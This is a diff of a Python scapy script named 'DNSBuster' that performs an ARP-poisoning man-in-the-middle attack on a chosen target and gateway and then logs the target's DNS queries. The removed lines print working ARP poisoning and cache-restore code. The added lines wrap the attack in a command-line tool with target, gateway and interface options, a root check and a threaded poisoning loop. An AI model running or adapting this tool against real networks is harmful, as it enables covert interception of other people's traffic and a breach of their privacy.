@@ -1,44 +1,45 @@
-from scapy.all import *
-# from scapy.all import Ether, srp, ARP, conf, sendp, send, IP, DNS
+from scapy.all import IP, DNS, conf, sniff
+from mitm import Mitm
+
 import sys
-import time
+import os
+import argparse
+import threading
+
+
+#Some color stuffs
+white = '\033[1;97m'
+green = '\033[1;32m'
+blue = '\033[94m'
+red = '\033[1;31m'
+yellow = '\033[1;33m'
+magenta = '\033[1;35m'
+end = '\033[1;m'
+info = '\033[1;33m[!]\033[1;m '
+res = '\033[1;35m[*]\033[1;m '
+que =  '\033[1;34m[?]\033[1;m '
+bad = '\033[1;31m[-]\033[1;m '
+good = '\033[1;32m[+]\033[1;m '
+run = '\033[1;97m[~]\033[1;m '
+
+__version__ = "0.1"
+__banner__= """%s
+
+ _____   ______     _    ______                             
+(____ \ |  ___ \   | |  (____  \            _               
+ _   \ \| |   | |   \ \  ____)  )_   _  ___| |_  ____  ____ 
+| |   | | |   | |    \ \|  __  (| | | |/___)  _)/ _  )/ ___)
+| |__/ /| |   | |_____) ) |__)  ) |_| |___ | |_( (/ /| |    
+|_____/ |_|   |_(______/|______/ \____(___/ \___)____)_|    
+                                                            
+%s"""%(yellow, end)
 
 
 interface = "wlo1"
 conf.verb = 0
 # set with conf.iface = "wlo1"
 
-def get_mac(ip):
-        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, inter = 0.1)
-        for snd,rcv in ans:
-                return rcv.sprintf(r"%Ether.src%")
 
-class Mitm():
-    def __init__(self, target_ip, gateway_ip):
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.broadcast = "ff:ff:ff:ff:ff:ff"
-        self.target_mac = get_mac(target_ip)
-        self.gateway_mac = get_mac(gateway_ip)
-        self.attack = True
-
-    def restore_arp(self):
-        # used layer 3 send() here
-        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
-        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
-        print("[*] ARP Restore packets sent.")
-
-    def arp_poison(self, mode=2):
-        # used Layer 2 sendp() here
-        # print("[+] Starting ARP Poison ... ")
-        # while self.attack:
-        sendp(Ether(dst=self.target_mac)/ARP(op=mode, psrc = self.gateway_ip, pdst = self.target_ip))
-        sendp(Ether(dst=self.gateway_mac)/ARP(op=mode, psrc = self.target_ip, pdst = self.gateway_ip))
-        
-    def stop(self):
-        self.attack = False
-        self.restore_arp()
-    
 
 def DNSsniff(packet):
     if IP in packet:
@@ -49,25 +50,43 @@ def DNSsniff(packet):
             # parse only DNS queries
             
             if dns_layer.qr == 0:
-                print("[*] SRC:",ip_src,"-->",dns_layer.qd.qname)
+                print(res+"Source:",ip_src,"-->",dns_layer.qd.qname)
 
 def main():
-    target_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
+    ap = argparse.ArgumentParser(description="DNSBuster")
+    ap.add_argument("-i","--interface", required=True, help="Name of the interface used for the attack.")
+    ap.add_argument("-t","--target", required=True, help="IP Address of the target")
+    ap.add_argument("-g","--gateway", required=True, help="IP Address of the gateway")
+    ap.add_argument("--timeout", help="Sent timeout for APR Poison packets", default="2")
+    args = ap.parse_args()
 
-    mitm = Mitm(target_ip, gateway_ip)
+    if os.geteuid() != 0:
+        print(bad+"Need root privilages to run")
+        sys.exit(1)
+
+    mitm = Mitm(args.target, args.gateway)
+    # mitm.setDaemon(True)
+
+    # start ARP poisoning thread
+    if mitm.check_init():
+        print(info+"Starting ARP Poisoning on target %s"%(args.target))
+        mitm.start()
+    else:
+        print(info+"Exiting...")
+        sys.exit(1)
+
     try:
-        while True:
-            mitm.arp_poison()
-            print("ARP Poison packet sent --")
-            time.sleep(2)
+        sniff(iface=args.interface, filter="port 53", prn=DNSsniff, store=0)
+        mitm.stop()
+        mitm.join()
+        print(info+"Stopping the DNSBuster ...")
     except KeyboardInterrupt:
         mitm.stop()
-        print("Stopping the Poisoning")
+        mitm.join()
+        print(info+"Stopping the DNSBuster ...")
+        sys.exit(0)
 
 
 if __name__ == '__main__':
+    print(__banner__)
     main()
-
-    # print("[+] Starting DNSSniffer x1 ...")
-    # sniff(iface=interface, filter="port 53", prn=DNSsniff, store=0)
